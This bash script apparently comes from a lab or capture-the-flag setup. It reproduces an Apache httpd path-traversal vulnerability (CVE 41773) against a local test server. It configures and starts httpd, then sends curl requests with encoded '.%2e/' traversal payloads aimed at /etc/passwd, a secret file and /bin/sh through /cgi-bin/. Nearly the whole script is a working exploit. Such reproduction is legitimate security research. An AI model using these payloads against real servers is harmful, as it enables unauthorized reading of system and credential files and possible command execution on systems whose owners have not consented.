#!/bin/bash
# 快速实验：Alias 路径穿越读取 /etc/passwd
set -u
ROOT="/mnt/e/强网拟态/cve/apache"
PREFIX=/opt/httpd
pkill -f "$PREFIX/bin/httpd" 2>/dev/null || true; sleep 0.5
cp -f "$ROOT/conf/httpd.conf" "$PREFIX/conf/httpd-41773.conf"
cat >> "$PREFIX/conf/httpd-41773.conf" <<'EOF'
Alias /icons/ "/opt/httpd/icons/"
<Directory "/opt/httpd/icons">
    AllowOverride None
    Options Indexes MultiViews
    Require all granted
</Directory>
EOF
mkdir -p "$PREFIX/icons"; echo icon > "$PREFIX/icons/icon.txt"
cd "$PREFIX"; : > logs/error_log; : > logs/access_log
"$PREFIX/bin/httpd" -f "$PREFIX/conf/httpd-41773.conf" -DFOREGROUND > /tmp/apx-console.log 2>&1 &
sleep 1
for u in \
 "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd" \
 "/icons/../../../../etc/passwd" \
 "/icons/.%2e/.%2e/.%2e/.%2e/opt/httpd-secret-41773.txt" \
 "/cgi-bin/.%2e/.%2e/.%2e/.%2e/opt/httpd-secret-41773.txt" \
 "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
do
  echo "===== $u"
  curl -sS -i --path-as-is "http://127.0.0.1:8082$u" | head -8
  echo
done
echo "=== error log ==="; tail -10 logs/error_log
pkill -f "$PREFIX/bin/httpd" 2>/dev/null || true
